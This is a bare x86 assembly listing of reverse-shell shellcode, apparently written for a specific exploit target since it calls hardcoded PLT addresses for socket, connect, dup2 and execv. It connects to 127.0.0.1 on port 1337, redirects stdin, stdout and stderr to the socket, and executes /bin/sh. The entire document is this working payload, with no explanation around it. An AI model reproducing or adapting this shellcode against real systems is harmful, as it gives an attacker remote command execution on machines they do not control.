push ebp
mov ebp, esp

sub esp, 0x24
mov    DWORD PTR [ebp-0x1c],0x0
mov    DWORD PTR [ebp-0x18],0x0
mov    DWORD PTR [ebp-0x14],0x0
mov    DWORD PTR [ebp-0x10],0x0
sub esp, 0x04
push 0x0
push 0x1
push 0x2

mov edx, 0x08048730 /* address of socket@plt */
call edx

add esp, 0x10
mov    DWORD PTR [ebp-0xc],eax
mov    WORD PTR [ebp-0x1c],0x2
sub    esp,0xc
push   0x539

mov edx, 0x08048640 /* address of htons@plt */
call   edx

add    esp,0x10
mov    WORD PTR [ebp-0x1a],ax
sub    esp,0xc

JMP _WANT_IP_ADD
_GOT_IP_ADD:
mov edx, 0x08048740 /* address of inet_addr@plt */
call edx

add    esp,0x10
mov    DWORD PTR [ebp-0x18],eax
sub    esp,0x4
push   0x10
lea    eax,[ebp-0x1c]
push   eax
push   DWORD PTR [ebp-0xc]

mov edx, 0x08048750 /* address of connect@plt */
call edx

add    esp,0x10
sub    esp,0x8
push   0x0
push   DWORD PTR [ebp-0xc]

mov edx, 0x08048600 /* address of dup2@plt */
call edx

add    esp,0x10
sub    esp,0x8
push   0x1
push   DWORD PTR [ebp-0xc]

mov edx, 0x08048600 /* address of dup2@plt */
call edx

add    esp,0x10
sub    esp,0x8
push   0x2
push   DWORD PTR [ebp-0xc]

mov edx, 0x08048600 /* address of dup2@plt */
call edx

add    esp,0x10
mov    DWORD PTR [ebp-0x20],0x0
sub    esp,0x8
lea    eax,[ebp-0x20]
push   eax

JMP _WANT_BIN_BASH
_GOT_BIN_BASH:

mov edx, 0x080486d0 /* address of execv@plt */
call edx

_WANT_IP_ADD:

CALL _GOT_IP_ADD
.STRING "127.0.0.1"

_WANT_BIN_BASH:

CALL _GOT_BIN_BASH
.STRING "/bin/sh"